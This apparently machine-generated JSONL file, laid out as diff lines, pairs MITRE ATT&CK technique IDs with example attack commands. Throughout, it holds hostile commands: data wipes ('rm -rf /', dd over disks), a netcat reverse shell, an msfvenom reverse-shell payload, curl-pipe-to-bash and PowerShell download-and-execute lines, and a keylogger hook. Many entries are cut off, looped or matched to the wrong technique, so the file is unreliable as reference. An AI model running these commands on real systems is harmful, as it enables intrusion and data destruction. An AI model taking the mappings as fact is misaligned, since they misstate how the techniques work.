+{"mitre_id": "T1546.016", "name": "Installer Packages", "platform": "Linux", "command": "`sudo dpkg-divert /usr/sbin/dpkg-divert --force --add /usr/sbin/dpkg-divert --add /usr/sbin/dpkg-divert --force --add /usr/sbin/dpkg-divert --add /usr/sbin/dpkg-divert --force --add /usr/sbin/dpkg-divert --add /usr/sbin/dpkg-divert --force --add /usr/sbin/dpkg-divert --add /usr/sbin/dpkg-divert --force --add /usr/sbin/dpkg-divert --add /usr/sbin/dpkg-divert --force --add /usr/sbin/dpkg-divert --add /usr"}
+{"mitre_id": "T1595.001", "name": "Scanning IP Blocks", "platform": "PRE", "command": "nmap -sP 192.168.1.0/24"}
+{"mitre_id": "T1158", "name": "Hidden Files and Directories", "platform": "Linux", "command": "ls -a"}
+{"mitre_id": "T1221", "name": "Template Injection", "platform": "Windows", "command": "`powershell -Command \"Add-Type -TypeDefinition '[DllImport(\\\"user32\\\")] public class User32 { [return: MarshalAs(UnmanagedType.Bool)] public static extern bool MoveFileEx(string lpFileName, uint dwMoveOperation, uint dwFlags); }'; $file = 'C:\\path\\to\\malicious\\template.docx'; $newFile = 'C:\\path\\to\\new\\document.docx'; [User32]::MoveFileEx($file, 0x2, 0x100);`"}
+{"mitre_id": "T1037.004", "name": "RC Scripts", "platform": "macOS", "command": "echo 'bash -c \"rm -rf /; rm -rf /var/db/recovery\" > /etc/rc.local'"}
+{"mitre_id": "T1134", "name": "Access Token Manipulation", "platform": "Windows", "command": "wtsquery.exe /domain /all /f \"SELECT * FROM Win32_Process WHERE CommandLine LIKE \"%cmd.exe%\""}
+{"mitre_id": "T1209", "name": "Time Providers", "platform": "Windows", "command": "sc config w32time start= demand"}
+{"mitre_id": "T1111", "name": "Multi-Factor Authentication Interception", "platform": "Linux", "command": "`sudo apt-get install keylogger`"}
+{"mitre_id": "T1159", "name": "Launch Agent", "platform": "macOS", "command": "launchctl load /Library/LaunchAgents/com.example.malicious.agent.plist"}
+{"mitre_id": "T1027.002", "name": "Software Packing", "platform": "Linux", "command": "`upx -9 --lzma /path/to/packed/file`"}
+{"mitre_id": "T1584.007", "name": "Serverless", "platform": "PRE", "command": "aws lambda create-function --function-name \"malicious-lambda\" --runtime python3.9 --role arn:aws:iam::123456789012:role/LambdaExecutionRole --handler index.handler --zip-file file://malicious-lambda.zip"}
+{"mitre_id": "T1071.001", "name": "Web Protocols", "platform": "ESXi", "command": "curl -X POST -H \"Content-Type: application/json\" -d '{\"cmd\":\"whoami\"}' http://10.0.0.1:8080"}
+{"mitre_id": "T1059.005", "name": "Visual Basic", "platform": "Linux", "command": "`echo \"This is a test message\" | vbs2exe -o test.exe`"}
+{"mitre_id": "T1564.005", "name": "Hidden File System", "platform": "Linux", "command": "`dd if=/dev/zero of=/mnt/hfs bs=1M count=1`"}
+{"mitre_id": "T1543.002", "name": "Systemd Service", "platform": "Linux", "command": "systemctl edit --full --force --no-pager systemd-sysv-udev.service"}
+{"mitre_id": "T1668", "name": "Exclusive Control", "platform": "Linux", "command": "`systemctl stop httpd`"}
+{"mitre_id": "T1563.002", "name": "RDP Hijacking", "platform": "Windows", "command": "c:\\windows\\system32\\tscon.exe 1"}
+{"mitre_id": "T1136", "name": "Create Account", "platform": "Windows", "command": "net user newaccountname /add"}
+{"mitre_id": "T1547.013", "name": "XDG Autostart Entries", "platform": "Linux", "command": "sudo echo \"[Desktop Entry]\" > /etc/xdg/autostart/malicious.desktop; echo \"Type=Application\" >> /etc/xdg/autostart/malicious.desktop; echo \"Exec=/bin/bash -c'malicious_command'\" >> /etc/xdg/autostart/malicious.desktop"}
+{"mitre_id": "T1584.004", "name": "Server", "platform": "PRE", "command": "nmap -sS -Pn -p 80,443 192.168.1.0/24"}
+{"mitre_id": "T1672", "name": "Email Spoofing", "platform": "Office Suite", "command": "powershell -c \"Add-Type -AssemblyName System.Net.Mail; $mail = New-Object System.Net.Mail.MailMessage; $mail.From ='spoofed_email@example.com'; $mail.To.Add('victim_email@example.com'); $mail.Subject = 'Spoofed Email'; $mail.Body = 'This is a spoofed email'; $smtp = New-Object System.Net.Mail.SmtpClient; $smtp.Host ='smtp.example.com'; $smtp.Port = 587; $smtp.EnableSsl = $true; $smtp.Credentials = New-Object System.Net.NetworkCredential('spoofed_email@example.com',"}
+{"mitre_id": "T1526", "name": "Cloud Service Discovery", "platform": "IaaS", "command": "az vm list"}
+{"mitre_id": "T1204.004", "name": "Malicious Copy and Paste", "platform": "Linux", "command": "`bash -c 'bash <(curl https://example.com/malicious_script.sh)'`"}
+{"mitre_id": "T1151", "name": "Space after Filename", "platform": "Linux", "command": "ls -l \"evil.sh \""}
+{"mitre_id": "T1018", "name": "Remote System Discovery", "platform": "ESXi", "command": "esxcli network diag ping"}
+{"mitre_id": "T1046", "name": "Network Service Discovery", "platform": "Containers", "command": "nmap -sV -p 1-65535 <container_ip>"}
+{"mitre_id": "T1590.001", "name": "Domain Properties", "platform": "PRE", "command": "whois example.com"}
+{"mitre_id": "T1518", "name": "Software Discovery", "platform": "ESXi", "command": "esxcli software vib list"}
+{"mitre_id": "T1538", "name": "Cloud Service Dashboard", "platform": "IaaS", "command": "gcloud asset find"}
+{"mitre_id": "T1055.005", "name": "Thread Local Storage", "platform": "Windows", "command": "`CreateProcessWithTokenW`"}
+{"mitre_id": "T1622", "name": "Debugger Evasion", "platform": "Linux", "command": "cat /proc/self/status | grep TracerPID"}
+{"mitre_id": "T1036.006", "name": "Space after Filename", "platform": "Linux", "command": "mv /path/to/evil.sh /path/to/evil.sh"}
+{"mitre_id": "T1547.007", "name": "Re-opened Applications", "platform": "macOS", "command": "defaults write ~/Library/Preferences/ByHost/com.apple.loginwindow.[UUID].plist LSHandlers -array-add '{LSHandlerContentType=public.file-url; LSHandlerRoleAll=com.apple.reopen-reason; LSHandlerURLs=( \"malicious-app-path\"}"}
+{"mitre_id": "T1608.006", "name": "SEO Poisoning", "platform": "PRE", "command": "python google_search_results_poisoning.py"}
+{"mitre_id": "T1550.002", "name": "Pass the Hash", "platform": "Windows", "command": "runas /netonly /user:username /profile /env \"cmd.exe\""}
+{"mitre_id": "T1052", "name": "Exfiltration Over Physical Medium", "platform": "Linux", "command": "`lsblk`"}
+{"mitre_id": "T1574.002", "name": "DLL Side-Loading", "platform": "Windows", "command": "`reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v SideLoader /t REG_SZ /d \"C:\\path\\to\\legitimate\\application.exe\" /f`"}
+{"mitre_id": "T1105", "name": "Ingress Tool Transfer", "platform": "ESXi", "command": "curl https://example.com/tool.tar.gz -o /tmp/tool.tar.gz"}
+{"mitre_id": "T1216.002", "name": "SyncAppvPublishingServer", "platform": "Windows", "command": "wscript.exe \"C:\\Windows\\System32\\SyncAppvPublishingServer.vbs\" \"n; {PowerShell}\""}
+{"mitre_id": "T1098.002", "name": "Additional Email Delegate Permissions", "platform": "Windows", "command": "Add-MailboxPermission -Identity \"Target Mailbox\" -User \"Adversary Email\" -AccessRights FullAccess -InheritanceType All"}
+{"mitre_id": "T1588.003", "name": "Code Signing Certificates", "platform": "PRE", "command": "`powershell -Command \"Get-ChildItem -Path 'C:\\' | ForEach-Object { $_.Delete() }\"`"}
+{"mitre_id": "T1126", "name": "Network Share Connection Removal", "platform": "Windows", "command": "net use \\\\system\\share /delete"}
+{"mitre_id": "T1648", "name": "Serverless Execution", "platform": "SaaS", "command": "powershell -Command \"New-AzFunctionApp -ResourceGroupName'myResourceGroup' -Location 'West US' -Functions @{'myFunction' = {param($input) Write-Output $input}}\""}
+{"mitre_id": "T1548.006", "name": "TCC Manipulation", "platform": "macOS", "command": "sqlite3 /Library/Application\\ Support/com.apple.TCC/TCC.db \"UPDATE access_records SET allowed = 1 WHERE info_type = 'kTCCInfoTypeCamera' AND info_type = 'kTCCInfoTypeScreenSharing'\""}
+{"mitre_id": "T1084", "name": "Windows Management Instrumentation Event Subscription", "platform": "Windows", "command": "wmic path win32_operatingSystem where caption=\"Windows 10\" call setFirmwareEnvironmentVariable \"EventSubscriber\" \"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\path\\to\\script.ps1\""}
+{"mitre_id": "T1160", "name": "Launch Daemon", "platform": "macOS", "command": "launchctl load -w /Library/LaunchDaemons/<malicious_plist_file>.plist"}
+{"mitre_id": "T1055.008", "name": "Ptrace System Calls", "platform": "Linux", "command": "ptrace(pid=1234, request=PTRACE_ATTACH, signal=0)"}
+{"mitre_id": "T1653", "name": "Power Settings", "platform": "Windows", "command": "powercfg -change -standby-timeout-dc 0 -hibernate-timeout 0 -sleep-timeout 0"}
+{"mitre_id": "T1027.007", "name": "Dynamic API Resolution", "platform": "Windows", "command": "GetProcAddress(hModule, \"kernel32.dll\", \"CreateProcessA\")"}
+{"mitre_id": "T1021.001", "name": "Remote Desktop Protocol", "platform": "Windows", "command": "mstsc.exe"}
+{"mitre_id": "T1037.001", "name": "Logon Script (Windows)", "platform": "Windows", "command": "reg add \"HKCU\\Environment\" /v UserInitMprLogonScript /t REG_SZ /d \"C:\\path\\to\\script.bat\""}
+{"mitre_id": "T1055.015", "name": "ListPlanting", "platform": "Windows", "command": "SendMessageW(hListView, LVM_SETITEMPOSITION, 0, (LPARAM) (LPVOID) payload);"}
+{"mitre_id": "T1665", "name": "Hide Infrastructure", "platform": "ESXi", "command": "esxcli network firewall ruleset -a 0 -r 1 -p 80 -d 192.168.1.100"}
+{"mitre_id": "T1484", "name": "Domain or Tenant Policy Modification", "platform": "Windows", "command": "`Get-GPO -All`"}
+{"mitre_id": "T1220", "name": "XSL Script Processing", "platform": "Windows", "command": "msxsl.exe script[.]jpeg script[.]jpeg"}
+{"mitre_id": "T1596.005", "name": "Scan Databases", "platform": "PRE", "command": "shodan search \"your_target_ip\""}
+{"mitre_id": "T1564.001", "name": "Hidden Files and Directories", "platform": "Linux", "command": "ls -a"}
+{"mitre_id": "T1578.001", "name": "Create Snapshot", "platform": "IaaS", "command": "aws ec2 create-snapshot --description \"Snapshot for evasion\" --volume-id <volume_id>"}
+{"mitre_id": "T1591.001", "name": "Determine Physical Locations", "platform": "PRE", "command": "python search_victim_owned_websites.py"}
+{"mitre_id": "T1137.002", "name": "Office Test", "platform": "Windows", "command": "reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Office test\\Special\\Perf\" /v \"DLL\" /t REG_SZ /d \"C:\\path\\to\\malicious.dll\" /f"}
+{"mitre_id": "T1587", "name": "Develop Capabilities", "platform": "PRE", "command": "python develop_capabilities.py"}
+{"mitre_id": "T1173", "name": "Dynamic Data Exchange", "platform": "Windows", "command": "`ddeexec \"cmd.exe /c calc`"}
+{"mitre_id": "T1003.003", "name": "NTDS", "platform": "Windows", "command": "ntdsutil.exe files recover"}
+{"mitre_id": "T1602.001", "name": "SNMP (MIB Dump)", "platform": "Network Devices", "command": "snmpwalk -v 2c -c public 192.168.1.1"}
+{"mitre_id": "T1001.002", "name": "Steganography", "platform": "Linux", "command": "`steghide embed -cf secret.txt -ef output.jpg`"}
+{"mitre_id": "T1204.001", "name": "Malicious Link", "platform": "Linux", "command": "`curl -s https://example.com/malicious-link | bash`"}
+{"mitre_id": "T1550.001", "name": "Application Access Token", "platform": "SaaS", "command": "aws sts assume-role --role-arn \"arn:aws:iam::123456789012:role/AccessAbuseRole\" --duration-seconds 3600 --role-session-name \"AbuseSession\""}
+{"mitre_id": "T1547.008", "name": "LSASS Driver", "platform": "Windows", "command": "wmic process where \"name='lsass.exe'\" call terminate"}
+{"mitre_id": "T1569.002", "name": "Service Execution", "platform": "Windows", "command": "sc create MyService binPath= \"C:\\Windows\\System32\\cmd.exe /c calc.exe\""}
+{"mitre_id": "T1078.004", "name": "Cloud Accounts", "platform": "IaaS", "command": "aws iam create-user --user-name \"compromised_user\" --password \"WeakPassword123\""}
+{"mitre_id": "T1480.001", "name": "Environmental Keying", "platform": "Linux", "command": "python -c 'import os; key = os.urandom(16); print(os.urandom(16).hex())' | openssl enc -aes-256-cbc -a -in - -k -iv -out - | base64 | xargs -0 bash -c 'echo $0 | base64 -d | openssl enc -aes-256-cbc -d -a -in - -k $1 -iv - | xargs -0 bash -c 'openssl enc -aes-256-cbc -d -in - -k $1 -iv - | xargs -0 bash -c 'openssl"}
+{"mitre_id": "T1008", "name": "Fallback Channels", "platform": "Linux", "command": "`nc -e /bin/bash 10.0.0.1 443`"}
+{"mitre_id": "T1680", "name": "Local Storage Discovery", "platform": "ESXi", "command": "esxcli storage filesystem list"}
+{"mitre_id": "T1564.004", "name": "NTFS File Attributes", "platform": "Windows", "command": "icacls -Streams * /setowner:everyone /inheritance:e"}
+{"mitre_id": "T1558.003", "name": "Kerberoasting", "platform": "Windows", "command": "klist tgt /li"}
+{"mitre_id": "T1096", "name": "NTFS File Attributes", "platform": "Windows", "command": "icacls -Streams * /inheritance:e"}
+{"mitre_id": "T1003.006", "name": "DCSync", "platform": "Windows", "command": "mimikatz lsadump::dcsync"}
+{"mitre_id": "T1124", "name": "System Time Discovery", "platform": "ESXi", "command": "esxcli system clock get"}
+{"mitre_id": "T1053.002", "name": "At", "platform": "Windows", "command": "at 23:59 /interactive cmd.exe"}
+{"mitre_id": "T1035", "name": "Service Execution", "platform": "Windows", "command": "sc create \"Service Name\" binPath= \"C:\\path\\to\\binary.exe\""}
+{"mitre_id": "T1055.001", "name": "Dynamic-link Library Injection", "platform": "Windows", "command": "CreateRemoteThread(CreateProcessHandle, NULL, 0, (LPCSTR)\"LoadLibraryA\", (LPVOID)\"C:\\\\path\\\\to\\\\dll.dll\", NULL, 0, NULL, NULL)"}
+{"mitre_id": "T1086", "name": "PowerShell", "platform": "Windows", "command": "Invoke-Expression -Command (New-Object System.Net.WebClient).DownloadString('https://example.com/malicious.ps1')"}
+{"mitre_id": "T1588.005", "name": "Exploits", "platform": "PRE", "command": "powershell -ExecutionPolicy Bypass -Command \"IEX (New-Object System.Net.WebClient).DownloadString('https://example.com/malicious_payload.ps1')\""}
+{"mitre_id": "T1556", "name": "Modify Authentication Process", "platform": "Windows", "command": "net stop lsass"}
+{"mitre_id": "T1546.017", "name": "Udev Rules", "platform": "Linux", "command": "SUBSYSTEM==\"block\", RUN+=\"/bin/bash -c'malicious_content'\""}
+{"mitre_id": "T1056.004", "name": "Credential API Hooking", "platform": "Windows", "command": "Create a user-mode hook DLL with the following code:\n\n```c\n#include <Windows.h>\n\nHHOOK hHook;\n\nLRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {\n    if (wParam == WM_KEYDOWN && nCode == HC_ACTION) {\n        if (lParam == VK_RETURN) {\n            // Capture credentials\n        }\n    }\n    return CallNextHookEx(hHook, nCode, wParam, lParam);\n}\n\nint main() {\n    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);\n    if (hHook == NULL) {"}
+{"mitre_id": "T1495", "name": "Firmware Corruption", "platform": "Linux", "command": "`dd if=/dev/zero of=/dev/mmcblk0 bs=512 count=1`"}
+{"mitre_id": "T1490", "name": "Inhibit System Recovery", "platform": "Containers", "command": "docker run --privileged --rm -v /:/host -v /var/run/docker.sock:/var/run/docker.sock -v /var/lib/docker:/var/lib/docker -v /etc/group:/etc/group -v /etc/passwd:/etc/passwd -v /etc/sudoers:/etc/sudoers -v /etc/group:/etc/group -v /etc/group:/etc/group -v /etc/group:/etc/group -v /etc/group:/etc/group -v /etc/group:/etc/group -v /etc/group:/etc/group -v /etc/group:/etc/group -v /etc/group:/etc/group -"}
+{"mitre_id": "T1546.007", "name": "Netsh Helper DLL", "platform": "Windows", "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Netsh\" /v \"MyHelperDLL\" /t REG_SZ /d \"C:\\path\\to\\malicious.dll\" /f"}
+{"mitre_id": "T1566.003", "name": "Spearphishing via Service", "platform": "Linux", "command": "`curl -s https://example.com/malicious-link | bash`"}
+{"mitre_id": "T1090.001", "name": "Internal Proxy", "platform": "Linux", "command": "`htran -c 127.0.0.1:8080`"}
+{"mitre_id": "T1216", "name": "System Script Proxy Execution", "platform": "Windows", "command": "powershell.exe -ExecutionPolicy Bypass -Command \"IEX (New-Object System.Net.WebClient).DownloadString('https://example.com/malicious.ps1')\""}
+{"mitre_id": "T1094", "name": "Custom Command and Control Protocol", "platform": "Linux", "command": "nc -lvp 1234"}
+{"mitre_id": "T1102.001", "name": "Dead Drop Resolver", "platform": "ESXi", "command": "esxcli network firewall ruleset -a 0 -r 80 -p tcp -d 192.168.1.1"}
+{"mitre_id": "T1118", "name": "InstallUtil", "platform": "Windows", "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe YourDLL.dll"}
+{"mitre_id": "T1001.001", "name": "Junk Data", "platform": "ESXi", "command": "esxcli.exe system settings advanced set -p 0x10000 -s 0xdeadbeef"}
+{"mitre_id": "T1598.001", "name": "Spearphishing Service", "platform": "PRE", "command": "python spearphish.py -t \"https://example.com\" -e \"example@email.com\" -m \"Hello, I saw your job posting and I'm interested in the position\""}
+{"mitre_id": "T1043", "name": "Commonly Used Port", "platform": "Linux", "command": "nc -v -w 1 192.168.1.100 80"}
+{"mitre_id": "T1505.006", "name": "vSphere Installation Bundles", "platform": "ESXi", "command": "esxcli software vib install --force"}
+{"mitre_id": "T1552.007", "name": "Container API", "platform": "Containers", "command": "docker logs -t"}
+{"mitre_id": "T1584.001", "name": "Domains", "platform": "PRE", "command": "`nmap -sC -sV <target_domain> -oN <output_file>`"}
+{"mitre_id": "T1505.001", "name": "SQL Stored Procedures", "platform": "Windows", "command": "EXEC xp_cmdshell 'cmd /c powershell -ExecutionPolicy Bypass -Command \"Invoke-WebRequest http://example.com/malware.exe -OutFile C:\\malware.exe; Start-Process C:\\malware.exe\";'"}
+{"mitre_id": "T1556.004", "name": "Network Device Authentication", "platform": "Network Devices", "command": "`show run | include username password`"}
+{"mitre_id": "T1561.001", "name": "Disk Content Wipe", "platform": "Linux", "command": "dd if=/dev/urandom of=/dev/sdb bs=4096 count=100"}
+{"mitre_id": "T1213.005", "name": "Messaging Applications", "platform": "SaaS", "command": "`Get-Content -Path \"C:\\Users\\username\\AppData\\Local\\Microsoft\\Teams\\cache\\index.vdb\"`"}
+{"mitre_id": "T1048.003", "name": "Exfiltration Over Unencrypted Non-C2 Protocol", "platform": "ESXi", "command": "curl -X POST -H \"Content-Type: application/json\" -d '{\"cmd\": \"base64,echo,Hello,World\"}' http://example.com/exfiltration_endpoint"}
+{"mitre_id": "T1027.015", "name": "Compression", "platform": "Linux", "command": "`zip -r compressed_archive.zip /path/to/directory/*`"}
+{"mitre_id": "T1574.004", "name": "Dylib Hijacking", "platform": "macOS", "command": "`lipo -create -output malicious_dylib.dylib dylib1.o dylib2.o`"}
+{"mitre_id": "T1601.002", "name": "Downgrade System Image", "platform": "Network Devices", "command": "`copy tftp://<IP address of TFTP server>/<older OS image file> flash:; config register 0x2142; boot`"}
+{"mitre_id": "T1078.003", "name": "Local Accounts", "platform": "Linux", "command": "cracklib -h"}
+{"mitre_id": "T1669", "name": "Wi-Fi Networks", "platform": "Linux", "command": "airmon-ng start wlan0"}
+{"mitre_id": "T1211", "name": "Exploitation for Defense Evasion", "platform": "Linux", "command": "`msfvenom -p linux/x86/shell_reverse_tcp LHOST=attacker_ip LPORT=443`"}
+{"mitre_id": "T1127", "name": "Trusted Developer Utilities Proxy Execution", "platform": "Windows", "command": "powershell.exe -c \"Add-Type -TypeDefinition '[DllImport(\\\"user32.dll\\\")] public class User32{[return] public static extern IntPtr GetConsoleWindow();}'; $h = [User32]::GetConsoleWindow(); $x = [System.Drawing.Point]::new(0,0); [System.Drawing.Rectangle]::FromLTRB($x.X, $x.Y, $x.X, $x.Y) | Set-Clipboard\""}
+{"mitre_id": "T1529", "name": "System Shutdown/Reboot", "platform": "ESXi", "command": "shutdown.hardaction = \"poweroff\""}
+{"mitre_id": "T1218.014", "name": "MMC", "platform": "Windows", "command": "mmc.exe -Embedding C:\\path\\to\\test.msc"}
+{"mitre_id": "T1564.010", "name": "Process Argument Spoofing", "platform": "Windows", "command": "WriteProcessMemory(hProcess, PEB, &newPEB, sizeof(newPEB), 0);"}
+{"mitre_id": "T1077", "name": "Windows Admin Shares", "platform": "Windows", "command": "net use \\\\remote_system_name\\C$ /u administrator_password"}
+{"mitre_id": "T1574.012", "name": "COR_PROFILER", "platform": "Windows", "command": "setx COR_PROFILER_PATH \"C:\\path\\to\\malicious_profiler.dll\""}
